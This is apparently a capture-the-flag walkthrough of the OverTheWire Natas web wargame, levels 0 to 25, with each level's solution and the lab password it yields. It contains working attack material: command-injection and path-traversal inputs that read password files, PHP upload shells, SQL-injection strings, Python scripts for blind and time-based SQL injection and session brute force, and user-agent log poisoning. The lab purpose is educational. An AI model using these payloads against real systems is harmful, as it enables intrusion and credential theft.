#  OverTheWire: Natas 

http://overthewire.org/wargames/natas/

### Level 0 

```
visit: http://natas0.natas.labs.overthewire.org/ with credentials natos0:natas0

view-source:http://natas0.natas.labs.overthewire.org/

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

### Level 1

```
view-source:http://natas1.natas.labs.overthewire.org/

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

### Level 2

```
view-source:http://natas2.natas.labs.overthewire.org/

<img src="files/pixel.png">

http://natas2.natas.labs.overthewire.org/files/pixel.png
http://natas2.natas.labs.overthewire.org/files/
http://natas2.natas.labs.overthewire.org/files/users.txt        <--- natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```

### Level 3

```
http://natas3.natas.labs.overthewire.org/robots.txt     <--- hint for not google cannot find as they use spider crawlers on the robots.txt
User-agent: *
Disallow: /s3cr3t/

http://natas3.natas.labs.overthewire.org/s3cr3t/
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt       <--- natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

### Level 4

```
Use tamper or burp suite to alter the referer header to http://natas5.natas.labs.overthewire.org

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
```

### Level 5

```
Modify "loggedin" cookie to 1

Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

### Level 6

```
View source code and see that it include "includes/secret.inc";
view-source:http://natas6.natas.labs.overthewire.org/includes/secret.inc        <--- FOEIUWGHFEEUHOFUOIU

Submit secret
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
```

### Level 7

```
view-source:http://natas7.natas.labs.overthewire.org/index.php
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

http://natas7.natas.labs.overthewire.org/index.php?page=../
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8       <--- DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
```

### Level 8

```
viewing source code provided we can do simply reverse the functions

root@kali:~# php -a
Interactive mode enabled

php > echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
oubWYf2kBq
php > oubWYf2kBq

W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

### Level 9

```
; cat /etc/natas_webpass/natas10 #
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

### Level 10

Grep inputs, we do .* /etc/natas_webpass/natas11 # to search all in that specific folder.
```
Input search:
.* /etc/natas_webpass/natas11 #

.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

### Level 11

We have our cookie ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D, which we will remove %3D is the equal in HTML entities. The idea is to original XOR encrypted = key. 
```
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$data = $defaultdata;

print xor_encrypt(json_encode($data));

?>

then

<?

$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = 'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$data = $defaultdata;

print base64_encode(xor_encrypt(json_encode($data)));

?>

Now editcookie ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK to get EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

### Level 12

```
Upload a.php file with commands
<?php
$file = file_get_contents('/etc/natas_webpass/natas13');
echo $file;
?>

I disabled JavaScript through developer tools and tampered the POST data request changing it to jpeg to back to php

jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

### Level 13
https://www.owasp.org/index.php/Unrestricted_File_Upload

```
BMP<? also works, GIF98

GIF98
<?php
$file = file_get_contents('/etc/natas_webpass/natas14');
echo $file;
?>

GIF98 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 
```

### Level 14
SQL injection

```
We can turn debug on and see the code 
natas14.natas.labs.overthewire.org/?debug=true&username=admin&password=admin
Executing query: SELECT * from users where username="admin" and password="admin"
Access denied!

Doing a simple injection such as, makes the statement always true:
" or ""="
" or ""="
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

### Level 15
SQL injection with only True/False responses. We check if natas16 is a username, then using a script by jhalon. It first does LIKE BINARY to check if a character 
e.g. natas16" and password LIKE BINARY "%3% gives user exists, so the password contains 1 or more occurence for the character 3. Then once we know what letters are in the password, we can bruteforce them. E.g. a trivial example (not exactly how it is implemented in code)

```
natas16" and password LIKE BINARY "%3%       NO USER, try next character
natas16" and password LIKE BINARY "%W%       USER EXISTS, move on to next character in the password    
natas16" and password LIKE BINARY "%W0%      NO USER, try next character and so forth    
```

```
natas16
This user exists


#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'
trueStr = 'This user exists.'

r = requests.get(target, verify=False)

for x in chars:
	r = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+x+'%" "')
	if r.content.find(trueStr) != -1:
		exist += x
		print 'Using: ' + exist

print 'All characters used. Starting brute force... Grab a coffee, might take a while!'

for i in range(32):
	for c in exist:
		r = requests.get(target+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
		if r.content.find(trueStr) != -1:
			password += c
			print 'Password: ' + password + '*' * int(32 - len(password))
			break

print 'Completed!'

root@kali:~# ./brute.py
Using: 0
Using: 03
Using: 035
Using: 0356
Using: 03569
Using: 03569a
Using: 03569ac
Using: 03569ace
Using: 03569aceh
Using: 03569acehi
Using: 03569acehij
Using: 03569acehijm
Using: 03569acehijmn
Using: 03569acehijmnp
Using: 03569acehijmnpq
Using: 03569acehijmnpqt
Using: 03569acehijmnpqtw
Using: 03569acehijmnpqtwB
Using: 03569acehijmnpqtwBE
Using: 03569acehijmnpqtwBEH
Using: 03569acehijmnpqtwBEHI
Using: 03569acehijmnpqtwBEHIN
Using: 03569acehijmnpqtwBEHINO
Using: 03569acehijmnpqtwBEHINOR
Using: 03569acehijmnpqtwBEHINORW
All characters used. Starting brute force... Grab a coffee, might take a while!
Password: W*******************************
Password: Wa******************************
Password: WaI*****************************
Password: WaIH****************************
Password: WaIHE***************************
Password: WaIHEa**************************
Password: WaIHEac*************************
Password: WaIHEacj************************
Password: WaIHEacj6***********************
Password: WaIHEacj63**********************
Password: WaIHEacj63w*********************
Password: WaIHEacj63wn********************
Password: WaIHEacj63wnN*******************
Password: WaIHEacj63wnNI******************
Password: WaIHEacj63wnNIB*****************
Password: WaIHEacj63wnNIBR****************
Password: WaIHEacj63wnNIBRO***************
Password: WaIHEacj63wnNIBROH**************
Password: WaIHEacj63wnNIBROHe*************
Password: WaIHEacj63wnNIBROHeq************
Password: WaIHEacj63wnNIBROHeqi***********
Password: WaIHEacj63wnNIBROHeqi3**********
Password: WaIHEacj63wnNIBROHeqi3p*********
Password: WaIHEacj63wnNIBROHeqi3p9********
Password: WaIHEacj63wnNIBROHeqi3p9t*******
Password: WaIHEacj63wnNIBROHeqi3p9t0******
Password: WaIHEacj63wnNIBROHeqi3p9t0m*****
Password: WaIHEacj63wnNIBROHeqi3p9t0m5****
Password: WaIHEacj63wnNIBROHeqi3p9t0m5n***
Password: WaIHEacj63wnNIBROHeqi3p9t0m5nh**
Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm*
Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
Completed!
```

### Level 16
Very similar to last level. They put some filtering, but we can still use some ideas from here, http://wiki.bash-hackers.org/syntax/expansion/cmdsubst. Injecting `$(grep a /etc/natas_webpass/natas17)` returns the whole content of the dictionary as it would run this `passthru("grep -i \"$(grep a /etc/natas_webpass/natas17)\" dictionary.txt");`. The reason for this is because, if `$(grep a /etc/natas_webpass/natas17)` is true, it will return a. So `grep -i aFriday dictionary.txt` would NOT be in the dictionary and return nothing meaning that a is a password.

To take the other case, if `$(grep a /etc/natas_webpass/natas17)` is false (meaning it cannot find a in natas17, so the pass doesn't contain a). Then it will return nothing and Friday will be found in the dictionary and we get some output.

To repeat: If grep a is true > outputs a > changes aFriday > no output (YES!)
           If grep a is false > outputs nothing > Friday doesn't change > outputs dictionary.txt for grep Friday
           
```
#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh*@natas16.natas.labs.overthewire.org/'
trueStr = 'Output:\n<pre>\n</pre>'

for x in chars:
        r = requests.get(target+'?needle=$(grep '+x+' /etc/natas_webpass/natas17)Fridays')
        if r.content.find(trueStr) != -1:
                exist += x
                print 'Using: ' + exist

print 'All characters used. Starting brute force... Grab a coffee, might take a while!'

for i in range(32):
        for c in exist:
                r = requests.get(target+'?needle=$(grep ^'+password+c+' /etc/natas_webpass/natas17)Fridays')
                if r.content.find(trueStr) != -1:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break
                        
print 'Completed!'

root@kali:~# ./brute.py
Used chars: 0
Used chars: 03
Used chars: 035
Used chars: 0357
Used chars: 03578
Used chars: 035789
Used chars: 035789b
Used chars: 035789bc
Used chars: 035789bcd
Used chars: 035789bcdg
Used chars: 035789bcdgh
Used chars: 035789bcdghk
Used chars: 035789bcdghkm
Used chars: 035789bcdghkmn
Used chars: 035789bcdghkmnq
Used chars: 035789bcdghkmnqr
Used chars: 035789bcdghkmnqrs
Used chars: 035789bcdghkmnqrsw
Used chars: 035789bcdghkmnqrswA
Used chars: 035789bcdghkmnqrswAG
Used chars: 035789bcdghkmnqrswAGH
Used chars: 035789bcdghkmnqrswAGHN
Used chars: 035789bcdghkmnqrswAGHNP
Used chars: 035789bcdghkmnqrswAGHNPQ
Used chars: 035789bcdghkmnqrswAGHNPQS
Used chars: 035789bcdghkmnqrswAGHNPQSW
All characters used. Starting brute force... Grab a coffee, might take a while!
Password: 8*******************************
Password: 8P******************************
Password: 8Ps*****************************
Password: 8Ps3****************************
Password: 8Ps3H***************************
Password: 8Ps3H0**************************
Password: 8Ps3H0G*************************
Password: 8Ps3H0GW************************
Password: 8Ps3H0GWb***********************
Password: 8Ps3H0GWbn**********************
Password: 8Ps3H0GWbn5*********************
Password: 8Ps3H0GWbn5r********************
Password: 8Ps3H0GWbn5rd*******************
Password: 8Ps3H0GWbn5rd9******************
Password: 8Ps3H0GWbn5rd9S*****************
Password: 8Ps3H0GWbn5rd9S7****************
Password: 8Ps3H0GWbn5rd9S7G***************
Password: 8Ps3H0GWbn5rd9S7Gm**************
Password: 8Ps3H0GWbn5rd9S7GmA*************
Password: 8Ps3H0GWbn5rd9S7GmAd************
Password: 8Ps3H0GWbn5rd9S7GmAdg***********
Password: 8Ps3H0GWbn5rd9S7GmAdgQ**********
Password: 8Ps3H0GWbn5rd9S7GmAdgQN*********
Password: 8Ps3H0GWbn5rd9S7GmAdgQNd********
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdk*******
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkh******
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP*****
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk****
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq***
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9**
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c*
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
Completed!
```

### Level 17

Same as last two levels, but this is a blind SQL injection attack as we get no response. Once, again I reused jhalon code as the levels are pretty much the same. But this time, we add a sleep(5) which will execute if it is true, otherwise we will do a timeout which will capture the false statement. This time-based technique is very common. 

```
#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'

r = requests.get(target)

for x in chars:
	try:
		r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "%' + x + '%", sleep(5), null) %23', timeout=1)
	except requests.exceptions.Timeout:
		exist += x
		print 'Using: ' + exist

print 'All characters used. Starting brute force... Grab a coffee, might take a while!'

for i in range(32):
	for c in exist:
		try:
			r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
		except requests.exceptions.Timeout:
			password += c
			print 'Password: ' + password + '*' * int(32 - len(password))
			break

print 'Completed!'

root@kali:~# ./brute.py
Using: 0
Using: 04
Using: 047
Using: 047d
Using: 047dg
Using: 047dgh
Using: 047dghj
Using: 047dghjl
Using: 047dghjlm
Using: 047dghjlmp
Using: 047dghjlmpq
Using: 047dghjlmpqs
Using: 047dghjlmpqsv
Using: 047dghjlmpqsvw
Using: 047dghjlmpqsvwx
Using: 047dghjlmpqsvwxy
Using: 047dghjlmpqsvwxyC
Using: 047dghjlmpqsvwxyCD
Using: 047dghjlmpqsvwxyCDF
Using: 047dghjlmpqsvwxyCDFI
Using: 047dghjlmpqsvwxyCDFIK
Using: 047dghjlmpqsvwxyCDFIKO
Using: 047dghjlmpqsvwxyCDFIKOP
Using: 047dghjlmpqsvwxyCDFIKOPR
All characters used. Starting brute force... Grab a coffee, might take a while!
Password: x*******************************
Password: xv******************************
Password: xvK*****************************
Password: xvKI****************************
Password: xvKIq***************************
Password: xvKIqD**************************
Password: xvKIqDj*************************
Password: xvKIqDjy************************
Password: xvKIqDjy4***********************
Password: xvKIqDjy4O**********************
Password: xvKIqDjy4OP*********************
Password: xvKIqDjy4OPv********************
Password: xvKIqDjy4OPv7*******************
Password: xvKIqDjy4OPv7w******************
Password: xvKIqDjy4OPv7wC*****************
Password: xvKIqDjy4OPv7wCR****************
Password: xvKIqDjy4OPv7wCRg***************
Password: xvKIqDjy4OPv7wCRgD**************
Password: xvKIqDjy4OPv7wCRgDl*************
Password: xvKIqDjy4OPv7wCRgDlm************
Password: xvKIqDjy4OPv7wCRgDlmj***********
Password: xvKIqDjy4OPv7wCRgDlmj0**********
Password: xvKIqDjy4OPv7wCRgDlmj0p*********
Password: xvKIqDjy4OPv7wCRgDlmj0pF********
Password: xvKIqDjy4OPv7wCRgDlmj0pFs*******
Password: xvKIqDjy4OPv7wCRgDlmj0pFsC******
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCs*****
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsD****
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDj***
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh**
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd*
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
Completed!
```

### Level 18
We can see from the source code that user gets assigns an ID, we need to brute force and check these ID for the admin credentials. The source code will print `You are an admin. The credentials for the next level are` giving our statement.

```
#!/usr/bin/python

import requests

target = 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/'
trueStr = 'You are an admin.'

r = requests.get(target, verify=False)

print 'This might take a while'

for i in range(0, 641):
    cookies = dict(PHPSESSID=str(i))
    r = requests.get(target, cookies=cookies)
    print 'Testing for session =' + str(i)

    if r.content.find(trueStr) != -1:
        print 'Found it! Session =' + str(i)
        print r.content
        break

print 'Completed!'

root@kali:~# python brute.py
This might take a while
Testing for session =0
...
...
Testing for session =138
Found it! Session =138
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

Completed!
```

Most of the previous ones can be done via Burp suite as well, but this tends to be slow as they throttle for free edition. For learning purposes:

```
Set Firefox proxy settings for 127.0.01:8080

Intercept http://natas18.natas.labs.overthewire.org/index.php and send to intruder.

In intruder, we only need to capture ยง the number for PHPSESSID, so we can remove the ยง from the others. E.g. keep Cookie: PHPSESSID=ยง275ยง

now in the payload tab, we set the numbers for 0-640

in the options tab, we extract grep item for the response of the page, now start the attack!
```

### Level 19

We can analyse the PHPSESSID to see a pattern. Can you see it? After 2d, a=61 and b=62... This is in hex, and 2d represents "-". The only part we have to guess is the thing before the "-", using the previous codes.

```
username=
PHPSESSID=3438352d

username=a
PHPSESSID=3132352d61

username=b
PHPSESSID=3338382d62

username=ab
PHPSESSID=3631372d6162
```

```
#!/usr/bin/python

import requests

target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'
trueStr = 'You are an admin.'

r = requests.get(target, verify=False)

print 'This might take a while'

for i in range(0, 641):
    cookies = dict(PHPSESSID=(str(i)+'-admin').encode('hex'))
    r = requests.get(target, cookies=cookies)
    print 'Testing for session =' + str(i)

    if r.content.find(trueStr) != -1:
        print 'Found it! Session =' + str(i)
        print r.content
        break

print 'Completed!'

root@kali:~# python a.py
This might take a while
Testing for session =0
...
...
Testing for session =89
Found it! Session =89
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
</body>
</html>

Completed!
```

### Level 20

```
natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin%201&debug=true
with cookies set to asd

 DEBUG: MYREAD asd
DEBUG: Reading from /var/lib/php5/sessions//mysess_asd
DEBUG: Read [admin 1]
DEBUG: Read [name admin]
DEBUG: Read [admin 1]
DEBUG: Read []
DEBUG: Name set to admin admin 1
You are an admin. The credentials for the next level are:

Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

### Level 21

```
Visit http://natas21-experimenter.natas.labs.overthewire.org/ with same credentials too. Now, adding admin=1 in the cookie with the same PHPSESSID should result in effecting the previous session.

You are an admin. The credentials for the next level are:

Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

### Level 22

Adding `?revelio=1` means array exist so it should give me admin credentials, however it seems I am being redirected or some sort. Using curl can stop this.

```
root@kali:~# curl http://natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ@natas22.natas.labs.overthewire.org/?revelio=1


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Level 23

From the source, strstr() seperates at iloveyou and the leftside is taken, if not indicated. We also need to satisfy ($_REQUEST["passwd"] > 10 ) which if we put a number, e.g. 11>10

```
11iloveyou
The credentials for the next level are:

Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

### Level 24

Change GET request to make strcmp() fail

```
http://natas24.natas.labs.overthewire.org/?passwd[]=


The credentials for the next level are:

Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

### Level 25
LFI on lang and command injection in logRequest()through HTTP user-agent. Note that safeinclude() filters ../

```
http://natas25.natas.labs.overthewire.org/?lang=../
Warning: include(/var/www/natas/natas25/language): failed to open stream: No such file or directory in /var/www/natas/natas25/index.php on line 38

set user-agent: <?php echo file_get_contents('/etc/natas_webpass/natas26') ?> or <? readfile('/etc/natas_webpass/natas26') ?>

http://natas25.natas.labs.overthewire.org/?lang=../.../...//logs/natas25_doj42nqbdkb1dlkdcqgc54hk33.log
oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
```

